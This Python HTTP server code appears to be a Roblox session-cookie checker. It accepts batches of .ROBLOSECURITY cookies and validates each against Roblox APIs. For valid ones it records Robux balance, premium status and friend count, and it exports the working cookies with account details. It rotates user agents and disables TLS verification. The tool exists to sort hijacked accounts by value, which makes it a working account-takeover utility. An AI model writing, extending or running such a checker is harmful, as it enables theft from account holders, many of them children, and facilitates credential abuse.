from http.server import BaseHTTPRequestHandler
import json, requests, time, threading, random
from datetime import datetime, timezone
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Data persistence
DATA_DIR = "/tmp/data"
CHECKER_STATE_FILE = os.path.join(DATA_DIR, "checker_state.json")
file_lock = threading.Lock()
_state_cache = None
_cache_timestamp = 0
CACHE_DURATION = 10  # seconds for state cache

def init_data_dir():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)

init_data_dir()

def load_checker_state():
    global _state_cache, _cache_timestamp
    current_time = time.time()

    # Return cached data if still valid
    if _state_cache is not None and (current_time - _cache_timestamp) < CACHE_DURATION:
        return _state_cache

    # Load from file and cache it
    with file_lock:
        try:
            with open(CHECKER_STATE_FILE, 'r') as f:
                _state_cache = json.load(f)
        except:
            _state_cache = {
                'is_checking': False,
                'current_thread': None,
                'results': [],
                'live_data': {
                    'status': 'idle',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'friends': 0,
                    'progress': 0,
                    'current': 0,
                    'total': 0,
                    'start_time': None
                }
            }

    _cache_timestamp = current_time
    return _state_cache

def save_checker_state(state):
    global _state_cache, _cache_timestamp
    # Create a copy without the thread object (not serializable)
    serializable_state = {
        'is_checking': state['is_checking'],
        'results': state['results'],
        'live_data': state['live_data']
    }

    with file_lock:
        with open(CHECKER_STATE_FILE, 'w') as f:
            json.dump(serializable_state, f, indent=2)

    # Update cache
    _state_cache = serializable_state
    _cache_timestamp = time.time()

def auto_save_state():
    """Auto-save checker state every 30 seconds if there are changes"""
    while True:
        try:
            time.sleep(30)  # Save every 30 seconds
            if checker_state['results'] or checker_state['live_data']['total_checked'] > 0:
                save_checker_state(checker_state)
        except Exception as e:
            print(f"Auto-save error: {e}")
            time.sleep(60)  # Wait longer if error

# Initialize checker state from persistent storage
checker_state = load_checker_state()

# Start auto-save thread
auto_save_thread = threading.Thread(target=auto_save_state, daemon=True)
auto_save_thread.start()

class handler(BaseHTTPRequestHandler):
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()
    
    def do_GET(self):
        if self.path == '/api/check' or self.path == '/api/check?action=status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {
                'status': checker_state['live_data']['status'],
                'is_checking': checker_state['is_checking'],
                'stats': checker_state['live_data'],
                'time': datetime.now(timezone.utc).isoformat()
            }
            
            self.wfile.write(json.dumps(response).encode())
            return
        
        elif self.path == '/api/check?action=results':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            self.wfile.write(json.dumps(checker_state['results'][-100:]).encode())
            return
        
        elif self.path == '/api/check?action=logs':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            valid_cookies = []
            for result in checker_state['results']:
                if result['status'] == 'valid':
                    valid_cookies.append({
                        'cookie_id': result['cookie_id'],
                        'username': result['username'],
                        'user_id': result['user_id'],
                        'display_name': result['display_name'],
                        'robux': result.get('robux', 0),
                        'premium': result.get('premium', False),
                        'friends': result.get('friends_count', 0),
                        'created_date': result.get('created_date', ''),
                        'timestamp': result['timestamp']
                    })
            
            response = {
                'total_results': len(checker_state['results']),
                'valid_count': len(valid_cookies),
                'invalid_count': len(checker_state['results']) - len(valid_cookies),
                'total_robux': sum([r.get('robux', 0) for r in checker_state['results'] if r['status'] == 'valid']),
                'valid_cookies': valid_cookies,
                'all_logs': checker_state['results'][-50:]
            }
            
            self.wfile.write(json.dumps(response).encode())
            return
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            action = data.get('action', '')
            
            if action == 'start':
                cookies = data.get('cookies', [])
                
                if not cookies:
                    raise ValueError("No cookies provided")
                
                if checker_state['is_checking']:
                    raise ValueError("Checker is already running")
                
                checker_state['is_checking'] = True
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'running',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'friends': 0,
                    'progress': 0,
                    'current': 1,
                    'total': len(cookies),
                    'start_time': time.time()
                }
                
                thread = threading.Thread(target=check_cookies_batch, args=(cookies,))
                thread.daemon = True
                thread.start()
                checker_state['current_thread'] = thread
                
                response = {
                    'success': True,
                    'message': f'Started checking {len(cookies)} cookies',
                    'total': len(cookies)
                }
                
            elif action == 'stop':
                checker_state['is_checking'] = False
                checker_state['live_data']['status'] = 'stopped'
                
                response = {
                    'success': True,
                    'message': 'Checker stopped'
                }
                
            elif action == 'test':
                cookie = data.get('cookie', '')
                if not cookie:
                    raise ValueError("No cookie provided")
                
                result = check_single_cookie(cookie, 0)
                response = result
                
                checker_state['results'].append(result)
                
                if result['status'] == 'valid':
                    checker_state['live_data']['valid'] += 1
                    checker_state['live_data']['robux'] += result.get('robux', 0)
                    if result.get('premium', False):
                        checker_state['live_data']['premium'] += 1
                    if result.get('friends_count', 0):
                        checker_state['live_data']['friends'] += result.get('friends_count', 0)
                else:
                    checker_state['live_data']['invalid'] += 1
                
                checker_state['live_data']['total_checked'] += 1
                
            elif action == 'clear':
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'idle',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'friends': 0,
                    'progress': 0,
                    'current': 0,
                    'total': 0,
                    'start_time': None
                }
                
                response = {
                    'success': True,
                    'message': 'Results cleared'
                }
                
            elif action == 'export':
                valid_cookies = []
                for result in checker_state['results']:
                    if result['status'] == 'valid':
                        valid_cookies.append(result)

                export_data = "# VALID ROBLOX COOKIES EXPORT\n"
                export_data += f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
                export_data += f"# Total Valid: {len(valid_cookies)}\n"
                export_data += f"# Total Robux: {sum([r.get('robux', 0) for r in valid_cookies])}\n"
                export_data += f"# Total Premium: {len([r for r in valid_cookies if r.get('premium', False)])}\n\n"

                # Add cookies section
                export_data += "=== VALID COOKIES ===\n"
                for i, cookie in enumerate(valid_cookies):
                    export_data += f"{cookie.get('cookie', 'N/A')}\n"
                export_data += "\n"

                # Add account details section
                export_data += "=== ACCOUNT DETAILS ===\n"
                for i, cookie in enumerate(valid_cookies):
                    export_data += f"=== ACCOUNT {i+1} ===\n"
                    export_data += f"Username: {cookie['username']}\n"
                    export_data += f"Display Name: {cookie['display_name']}\n"
                    export_data += f"User ID: {cookie['user_id']}\n"
                    export_data += f"Robux: {cookie.get('robux', 0)}\n"
                    export_data += f"Premium: {'Yes' if cookie.get('premium', False) else 'No'}\n"
                    export_data += f"Friends: {cookie.get('friends_count', 0)}\n"
                    export_data += f"Created: {cookie.get('created_date', 'Unknown')}\n"
                    export_data += f"Checked: {cookie['timestamp']}\n\n"

                response = {
                    'success': True,
                    'export_data': export_data,
                    'filename': f'valid_cookies_{datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")}.txt'
                }

            elif action == 'save_state':
                # Manual save of current state
                save_checker_state(checker_state)
                response = {
                    'success': True,
                    'message': 'Checker state saved successfully',
                    'saved_at': datetime.now(timezone.utc).isoformat()
                }

            elif action == 'load_state':
                # Manual load of saved state
                loaded_state = load_checker_state()
                if loaded_state and loaded_state.get('results'):
                    checker_state['results'] = loaded_state['results']
                    checker_state['live_data'] = loaded_state['live_data']
                    response = {
                        'success': True,
                        'message': 'Checker state loaded successfully',
                        'total_results': len(checker_state['results']),
                        'loaded_at': datetime.now(timezone.utc).isoformat()
                    }
                else:
                    response = {
                        'success': False,
                        'message': 'No saved state found'
                    }
                
            else:
                raise ValueError("Invalid action")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'success': False,
                'error': str(e)
            }).encode())

def check_cookies_batch(cookies):
    # Use concurrent checking with limited workers to avoid rate limiting
    max_workers = min(3, len(cookies))  # Reduced to 3 concurrent requests

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all cookie checks
        future_to_cookie = {executor.submit(check_single_cookie, cookie, i): (cookie, i)
                          for i, cookie in enumerate(cookies)}

        # Process results as they complete
        completed_count = 0
        for future in as_completed(future_to_cookie):
            if not checker_state['is_checking']:
                break

            cookie, i = future_to_cookie[future]
            try:
                result = future.result()
                checker_state['results'].append(result)

                completed_count += 1
                checker_state['live_data']['current'] = completed_count
                checker_state['live_data']['total_checked'] = completed_count
                checker_state['live_data']['progress'] = int((completed_count / len(cookies)) * 100)

                if result['status'] == 'valid':
                    checker_state['live_data']['valid'] += 1
                    checker_state['live_data']['robux'] += result.get('robux', 0)
                    if result.get('premium', False):
                        checker_state['live_data']['premium'] += 1
                    if result.get('friends_count', 0):
                        checker_state['live_data']['friends'] += result.get('friends_count', 0)
                else:
                    checker_state['live_data']['invalid'] += 1

            except Exception as exc:
                print(f'Cookie check generated an exception: {exc}')
                # Add error result
                error_result = {
                    'cookie_id': i,
                    'cookie': cookie,
                    'status': 'error',
                    'username': 'Unknown',
                    'user_id': 'Unknown',
                    'display_name': 'Unknown',
                    'premium': False,
                    'robux': 0,
                    'friends_count': 0,
                    'avatar_url': '',
                    'created_date': '',
                    'error': str(exc),
                    'timestamp': datetime.now(timezone.utc).isoformat()
                }
                checker_state['results'].append(error_result)
                completed_count += 1
                checker_state['live_data']['current'] = completed_count
                checker_state['live_data']['total_checked'] = completed_count
                checker_state['live_data']['progress'] = int((completed_count / len(cookies)) * 100)
                checker_state['live_data']['invalid'] += 1

            # Small delay between processing results to avoid overwhelming
            time.sleep(0.05)

    if checker_state['is_checking']:
        checker_state['is_checking'] = False
        checker_state['live_data']['status'] = 'completed'

def check_single_cookie(cookie, cookie_id=0):
    # Validate cookie format first
    if not cookie or len(cookie.strip()) < 10:
        return {
            'cookie_id': cookie_id,
            'cookie': cookie,
            'status': 'invalid',
            'username': 'Unknown',
            'user_id': 'Unknown',
            'display_name': 'Unknown',
            'premium': False,
            'robux': 0,
            'friends_count': 0,
            'avatar_url': '',
            'created_date': '',
            'error': 'Cookie kosong atau format tidak valid',
            'timestamp': datetime.now(timezone.utc).isoformat()
        }

    # Create a session with retry strategy for better connection handling
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    headers = {
        'User-Agent': get_random_user_agent(),
        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
        'Accept': 'application/json',
        'X-CSRF-TOKEN': '',
        'Referer': 'https://www.roblox.com/',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

    result = {
        'cookie_id': cookie_id,
        'cookie': cookie,
        'status': 'error',
        'username': 'Unknown',
        'user_id': 'Unknown',
        'display_name': 'Unknown',
        'premium': False,
        'robux': 0,
        'friends_count': 0,
        'avatar_url': '',
        'created_date': '',
        'error': 'Unknown error',
        'timestamp': datetime.now(timezone.utc).isoformat()
    }

    # Step 1: Get CSRF token (optional - Roblox sometimes provides it automatically)
    try:
        csrf_url = "https://auth.roblox.com/v2/logout"
        csrf_response = session.post(csrf_url, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if 'x-csrf-token' in csrf_response.headers:
            headers['X-CSRF-TOKEN'] = csrf_response.headers['x-csrf-token']
        elif csrf_response.status_code == 403 and 'x-csrf-token' in csrf_response.headers:
            headers['X-CSRF-TOKEN'] = csrf_response.headers['x-csrf-token']
    except (requests.exceptions.SSLError, requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        # CSRF token is optional - continue without it
        headers['X-CSRF-TOKEN'] = ''
    except Exception as e:
        # CSRF token might not be critical for all requests
        headers['X-CSRF-TOKEN'] = ''

    # Step 2: Primary authentication check - most reliable method
    try:
        auth_url = "https://users.roblox.com/v1/users/authenticated"
        response = session.get(auth_url, headers=headers, timeout=15, verify=False, allow_redirects=True)

        if response.status_code == 200:
            try:
                user_data = response.json()
                result['username'] = user_data.get('name', 'Unknown')
                result['user_id'] = str(user_data.get('id', 'Unknown'))
                result['display_name'] = user_data.get('displayName', 'Unknown')
                result['status'] = 'valid'
                result['error'] = None

                # Get additional info concurrently for better performance
                user_id = result['user_id']
                if user_id != 'Unknown':
                    try:
                        # Get user profile info
                        profile_url = f"https://users.roblox.com/v1/users/{user_id}"
                        profile_resp = session.get(profile_url, headers=headers, timeout=10, verify=False)
                        if profile_resp.status_code == 200:
                            profile_data = profile_resp.json()
                            result['created_date'] = profile_data.get('created', '')

                        # Get avatar
                        avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=48x48&format=Png&isCircular=false"
                        avatar_resp = session.get(avatar_url, headers=headers, timeout=8, verify=False)
                        if avatar_resp.status_code == 200:
                            avatar_data = avatar_resp.json()
                            if avatar_data.get('data') and len(avatar_data['data']) > 0:
                                result['avatar_url'] = avatar_data['data'][0].get('imageUrl', '')

                        # Get premium status
                        premium_url = "https://premiumfeatures.roblox.com/v1/users/premium/membership"
                        premium_resp = session.get(premium_url, headers=headers, timeout=10, verify=False)
                        if premium_resp.status_code == 200:
                            result['premium'] = premium_resp.json().get('isPremium', False)

                        # Get Robux balance
                        economy_url = "https://economy.roblox.com/v1/user/currency"
                        economy_resp = session.get(economy_url, headers=headers, timeout=10, verify=False)
                        if economy_resp.status_code == 200:
                            result['robux'] = economy_resp.json().get('robux', 0)

                        # Get friends count
                        friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
                        friends_resp = session.get(friends_url, headers=headers, timeout=10, verify=False)
                        if friends_resp.status_code == 200:
                            result['friends_count'] = friends_resp.json().get('count', 0)

                    except Exception as e:
                        # Continue even if additional info fails
                        pass

            except json.JSONDecodeError:
                result['status'] = 'error'
                result['error'] = 'Invalid JSON response from Roblox API'

        elif response.status_code == 401:
            result['status'] = 'invalid'
            result['error'] = 'Cookie tidak valid atau sudah expired'
        elif response.status_code == 403:
            result['status'] = 'invalid'
            result['error'] = 'Akses ditolak (pembatasan keamanan Roblox)'
        elif response.status_code == 429:
            result['status'] = 'rate_limited'
            result['error'] = 'Rate limited - terlalu banyak request ke Roblox'
        elif response.status_code == 400:
            result['status'] = 'invalid'
            result['error'] = 'Cookie format tidak valid'
        else:
            result['status'] = 'error'
            result['error'] = f'HTTP {response.status_code}: {response.reason}'

    except requests.exceptions.Timeout:
        result['status'] = 'error'
        result['error'] = 'Timeout - Roblox server tidak merespons'
    except requests.exceptions.ConnectionError as e:
        result['status'] = 'error'
        result['error'] = f'Connection error - tidak dapat terhubung ke Roblox: {str(e)}'
    except requests.exceptions.SSLError as e:
        result['status'] = 'error'
        result['error'] = f'SSL error - masalah koneksi aman: {str(e)}'
    except requests.exceptions.RequestException as e:
        result['status'] = 'error'
        result['error'] = f'Request error: {str(e)}'
    except Exception as e:
        result['status'] = 'error'
        result['error'] = f'Unexpected error: {str(e)}'
    finally:
        session.close()

    return result



def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(user_agents)